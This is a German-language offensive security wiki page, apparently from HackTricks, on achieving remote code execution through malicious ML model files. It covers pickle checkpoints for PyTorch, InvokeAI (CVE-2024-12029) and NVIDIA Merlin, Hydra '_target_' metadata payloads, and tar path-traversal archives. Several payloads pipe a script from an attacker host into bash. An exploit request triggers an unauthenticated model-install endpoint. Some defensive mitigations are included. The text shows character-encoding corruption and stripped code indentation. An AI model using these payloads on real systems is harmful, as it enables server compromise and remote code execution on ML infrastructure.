# RCE in Modellen

{{#include ../banners/hacktricks-training.md}}

## Modelle laden bis zur RCE

Machine-Learning-Modelle werden √ºblicherweise in verschiedenen Formaten geteilt, z. B. ONNX, TensorFlow, PyTorch, etc. Diese Modelle k√∂nnen in Entwickler‚ÄëMaschinen oder Produktionssysteme geladen werden, um sie zu nutzen. Normalerweise sollten die Modelle keinen b√∂sartigen Code enthalten, aber es gibt F√§lle, in denen ein Modell verwendet werden kann, um willk√ºrlichen Code auf dem System auszuf√ºhren ‚Äî entweder als beabsichtigte Funktion oder aufgrund einer Schwachstelle in der Modell‚ÄëLoading‚ÄëBibliothek.

Zum Zeitpunkt der Erstellung sind dies einige Beispiele f√ºr diese Art von Schwachstellen:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | B√∂sartiges pickle im Modell‚ÄëCheckpoint f√ºhrt zur Codeausf√ºhrung (umgeht `weights_only`‚ÄëSchutz)                                           | |
| PyTorch **TorchServe**      | *ShellTorch* ‚Äì **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + b√∂swilliger Modelldownload verursacht Codeausf√ºhrung; Java‚ÄëDeserialisierungs‚ÄëRCE in der Management‚ÄëAPI                            | |
| **NVIDIA Merlin Transformers4Rec** | Unsichere Checkpoint‚ÄëDeserialisierung via `torch.load` **(CVE-2025-23298)**                                           | Nicht vertrauensw√ºrdiger Checkpoint l√∂st einen pickle‚ÄëReducer w√§hrend `load_model_trainer_states_from_checkpoint` aus ‚Üí Codeausf√ºhrung im ML‚ÄëWorker | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Laden eines Modells aus YAML verwendet `yaml.unsafe_load` (Codeausf√ºhrung) <br> Laden eines Modells mit **Lambda**‚ÄëLayer f√ºhrt beliebigen Python‚ÄëCode aus | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Manipuliertes `.tflite`‚ÄëModell l√∂st Integer‚ÄëOverflow aus ‚Üí Heap‚ÄëKorruption (potentiell RCE)                                              | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Laden eines Modells via `joblib.load` f√ºhrt ein pickle mit dem `__reduce__`‚ÄëPayload des Angreifers aus                                  | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *strittig*                                                                              | `numpy.load` erlaubt standardm√§√üig gepicklete Objektarrays ‚Äì b√∂sartige `.npy/.npz` l√∂st Codeausf√ºhrung aus                              | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Externer Weights‚ÄëPfad eines ONNX‚ÄëModells kann das Verzeichnis verlassen (liest beliebige Dateien) <br> B√∂sartiges ONNX‚ÄëTar kann beliebige Dateien √ºberschreiben (f√ºhrt zu RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Modell mit custom operator erfordert das Laden nativen Codes des Angreifers; komplexe Modellgraphen missbrauchen Logik, um unbeabsichtigte Berechnungen auszuf√ºhren | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Nutzung der model‚Äëload API mit `--model-control` aktiviert erlaubt relative Pfad‚ÄëTraversal, um Dateien zu schreiben (z. B. `.bashrc` √ºberschreiben f√ºr RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 ‚Ä¶ 25668** (mehrere Heap‚ÄëOverflows)                                                                         | Fehlerhafte GGUF‚ÄëModell‚ÄëDatei verursacht Heap‚ÄëBuffer‚ÄëOverflows im Parser und erm√∂glicht die Ausf√ºhrung beliebigen Codes auf dem Zielsystem | |
| **Keras (√§ltere Formate)**  | *(No new CVE)* Legacy Keras H5 model                                                                                         | B√∂sartige HDF5 (`.h5`)‚ÄëModelle mit Lambda‚ÄëLayer‚ÄëCode werden beim Laden weiterhin ausgef√ºhrt (Keras safe_mode deckt altes Format nicht ab ‚Äì ‚Äûdowngrade attack‚Äú) | |
| **Others** (general)        | *Design flaw* ‚Äì Pickle serialization                                                                                         | Viele ML‚ÄëTools (z. B. pickle‚Äëbasierte Modellformate, Python `pickle.load`) f√ºhren eingebetteten Code in Modell‚ÄëDateien aus, sofern nicht mitigiert | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Angreifer‚Äëkontrollierte Modell‚ÄëMetadaten/Config setzen `_target_` auf beliebig aufrufbares Objekt (z. B. `builtins.exec`) ‚Üí wird w√§hrend des Ladens ausgef√ºhrt, sogar mit ‚Äûsicheren‚Äú Formaten (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Au√üerdem gibt es einige python‚Äëpickle‚Äëbasierte Modelle, wie die von [PyTorch](https://github.com/pytorch/pytorch/security), die willk√ºrlichen Code auf dem System ausf√ºhren k√∂nnen, wenn sie nicht mit `weights_only=True` geladen werden. Daher sind grunds√§tzlich alle pickle‚Äëbasierten Modelle besonders anf√§llig f√ºr diese Angriffsart, auch wenn sie nicht in der obigen Tabelle aufgef√ºhrt sind.

### Hydra‚ÄëMetadaten ‚Üí RCE (funktioniert sogar mit safetensors)

`hydra.utils.instantiate()` importiert und ruft jede punktierte `_target_` in einem Konfigurations-/Metadaten‚ÄëObjekt auf. Wenn Bibliotheken **nicht vertrauensw√ºrdige Modell‚ÄëMetadaten** an `instantiate()` √ºbergeben, kann ein Angreifer einen Callable und Argumente liefern, die sofort beim Modell‚ÄëLaden ausgef√ºhrt werden (kein pickle erforderlich).

Payload‚ÄëBeispiel (funktioniert in `.nemo` `model_config.yaml`, repo `config.json`, oder `__metadata__` innerhalb von `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Wichtige Punkte:
- Getriggert vor der Modellinitialisierung in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, and FlexTok loaders.
- Hydras string block-list ist umgehbar √ºber alternative Importpfade (z. B. `enum.bltns.eval`) oder application-resolved names (z. B. `nemo.core.classes.common.os.system` ‚Üí `posix`).
- FlexTok parst au√üerdem stringifizierte Metadaten mit `ast.literal_eval`, was DoS (CPU/Memory-Blowup) vor dem Hydra-Aufruf erm√∂glicht.

### üÜï  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfl√§che f√ºr Stable-Diffusion. Versionen **5.3.1 ‚Äì 5.4.2** stellen den REST-Endpunkt `/api/v2/models/install` bereit, mit dem Benutzer Modelle von beliebigen URLs herunterladen und laden k√∂nnen.

Intern ruft der Endpunkt schlie√ülich auf:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wenn die bereitgestellte Datei ein **PyTorch checkpoint (`*.ckpt`)** ist, f√ºhrt `torch.load` eine **pickle deserialization** durch. Da der Inhalt direkt von einer vom Benutzer kontrollierten URL stammt, kann ein Angreifer ein b√∂sartiges Objekt mit einer benutzerdefinierten `__reduce__`-Methode in das checkpoint einbetten; die Methode wird **during deserialization** ausgef√ºhrt und f√ºhrt zu **remote code execution (RCE)** auf dem InvokeAI-Server.

Die Schwachstelle wurde mit **CVE-2024-12029** bezeichnet (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Erstelle ein b√∂sartiges checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hosten Sie `payload.ckpt` auf einem HTTP-Server, den Sie kontrollieren (z. B. `http://ATTACKER/payload.ckpt`).
3. L√∂sen Sie den verwundbaren endpoint aus (keine Authentifizierung erforderlich):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false ‚Üí no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wenn InvokeAI die Datei herunterl√§dt, ruft es `torch.load()` auf ‚Üí das `os.system`-Gadget wird ausgef√ºhrt und der Angreifer erh√§lt Codeausf√ºhrung im Kontext des InvokeAI-Prozesses.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.

#### Bedingungen

‚Ä¢  InvokeAI 5.3.1‚Äì5.4.2 (scan-Flag standardm√§√üig **false**)  
‚Ä¢  `/api/v2/models/install` f√ºr den Angreifer erreichbar  
‚Ä¢  Der Prozess hat Berechtigungen, Shell-Befehle auszuf√ºhren

#### Gegenma√ünahmen

* Auf **InvokeAI ‚â• 5.4.3** aktualisieren ‚Äì das Update setzt `scan=True` standardm√§√üig und f√ºhrt Malware-Scans vor der Deserialisierung durch.  
* Beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` verwenden oder den neuen Helfer [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) nutzen.  
* Allow-Lists / Signaturen f√ºr Modellquellen durchsetzen und den Dienst mit geringstm√∂glichen Rechten (least-privilege) betreiben.

> ‚ö†Ô∏è Denken Sie daran, dass **jedes** Python-Pickle-basierte Format (einschlie√ülich vieler `.pt`, `.pkl`, `.ckpt`, `.pth` Dateien) inh√§rent unsicher ist, aus nicht vertrauensw√ºrdigen Quellen zu deserialisieren.

---

Beispiel f√ºr eine ad-hoc Gegenma√ünahme, falls Sie √§ltere InvokeAI-Versionen hinter einem Reverse-Proxy weiter betreiben m√ºssen:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### üÜï NVIDIA Merlin Transformers4Rec RCE durch unsichere `torch.load` (CVE-2025-23298)

NVIDIAs Transformers4Rec (Teil von Merlin) stellte einen unsicheren checkpoint loader bereit, der direkt `torch.load()` auf vom Benutzer bereitgestellten Pfaden aufrief. Da `torch.load` auf Python `pickle` basiert, kann ein vom Angreifer kontrollierter checkpoint w√§hrend der Deserialisierung √ºber einen reducer beliebigen Code ausf√ºhren.

Verwundbarer Pfad (vor Fix): `transformers4rec/torch/trainer/trainer.py` ‚Üí `load_model_trainer_states_from_checkpoint(...)` ‚Üí `torch.load(...)`.

Warum das zu RCE f√ºhrt: Bei Python `pickle` kann ein Objekt einen reducer (`__reduce__`/`__setstate__`) definieren, der einen Callable und Argumente zur√ºckgibt. Der Callable wird w√§hrend des Unpicklings ausgef√ºhrt. Wenn ein solches Objekt in einem checkpoint vorhanden ist, l√§uft es, bevor irgendwelche Gewichte verwendet werden.

Minimales b√∂sartiges checkpoint-Beispiel:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanisierte checkpoints/models, die √ºber repos, buckets oder artifact registries geteilt werden
- Automatisierte resume/deploy Pipelines, die checkpoints automatisch laden
- Die Ausf√ºhrung findet innerhalb von training/inference workers statt, oft mit erh√∂hten Rechten (z. B. root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte das direkte `torch.load()` durch einen eingeschr√§nkten, allow-listed Deserializer, implementiert in `transformers4rec/utils/serialization.py`. Der neue Loader validiert Typen/Felder und verhindert, dass beliebige Callables w√§hrend des Ladens aufgerufen werden.

Defensive guidance specific to PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Erzwinge Modellprovenienz/-signaturen und sandboxed Deserialisierung (seccomp/AppArmor; non-root user; eingeschr√§nktes FS und keine ausgehende Netzwerkverbindung).
- √úberwache unerwartete Child-Prozesse von ML-Services zur Checkpoint-Ladezeit; verfolge `torch.load()`/`pickle`-Nutzung.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example ‚Äì crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modell laden:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ‚ö†Ô∏è This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialisierung Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent‚Äôs FaceDetection-DSFD stellt einen `resnet` endpoint bereit, der nutzergesteuerte Daten deserialisiert. ZDI best√§tigte, dass ein entfernter Angreifer ein Opfer dazu zwingen kann, eine b√∂sartige Seite/Datei zu laden, diese dazu zu bringen, ein crafted serialized blob an diesen endpoint zu senden, und so die Deserialisierung als `root` auszul√∂sen, was zur vollst√§ndigen Kompromittierung f√ºhrt.

Der Exploit-Ablauf spiegelt typischen pickle abuse wider:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Jedes gadget, das w√§hrend der deserialization erreichbar ist (constructors, `__setstate__`, framework callbacks, etc.), kann auf die gleiche Weise weaponized werden, unabh√§ngig davon, ob der Transport √ºber HTTP, WebSocket, oder eine Datei erfolgte, die in ein √ºberwachtes Verzeichnis gelegt wurde.

## Modelle f√ºr Path Traversal

Wie in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) kommentiert, basieren die meisten Modellformate, die von verschiedenen AI frameworks verwendet werden, auf Archiven, √ºblicherweise `.zip`. Daher kann es m√∂glich sein, diese Formate zu missbrauchen, um path traversal attacks durchzuf√ºhren und so beliebige Dateien von dem System zu lesen, auf dem das Modell geladen wird.

Zum Beispiel k√∂nnen Sie mit dem folgenden Code ein Modell erstellen, das beim Laden eine Datei im Verzeichnis `/tmp` anlegt:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oder mit dem folgenden Code k√∂nnen Sie ein model erstellen, das beim Laden einen symlink zum Verzeichnis `/tmp` erstellt:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: Keras .keras Deserialisierung und gadget hunting

F√ºr eine fokussierte Anleitung zu den .keras-Interna, Lambda-layer RCE, dem arbitrary import issue in ‚â§ 3.8 und zur post-fix gadget discovery innerhalb der allowlist, siehe:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referenzen

- [OffSec blog ‚Äì "CVE-2024-12029 ‚Äì InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch ‚Äì security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog ‚Äì CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 ‚Äì Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
